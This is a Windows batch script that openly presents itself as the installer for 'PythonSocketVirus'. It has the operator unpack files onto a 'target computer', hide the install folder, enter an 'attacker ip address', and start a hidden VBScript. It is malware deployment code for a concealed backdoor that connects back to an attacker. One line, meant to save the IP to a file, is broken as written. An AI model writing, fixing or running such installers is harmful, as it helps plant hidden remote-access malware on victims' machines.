@echo off
echo This will install PythonSocketVirus into computer. Press enter to continue.
pause
echo ********************************** 
echo ***********instructions***********
echo **********************************
echo extract all items in install.zip to C:/ in target computer. Press enter when ready.
pause
cd C:/
attrib /h install
cd install
set /p ip=attacker ip address
%ip% > ip.txt
echo finish installation
pause
start hide.vbs
exit
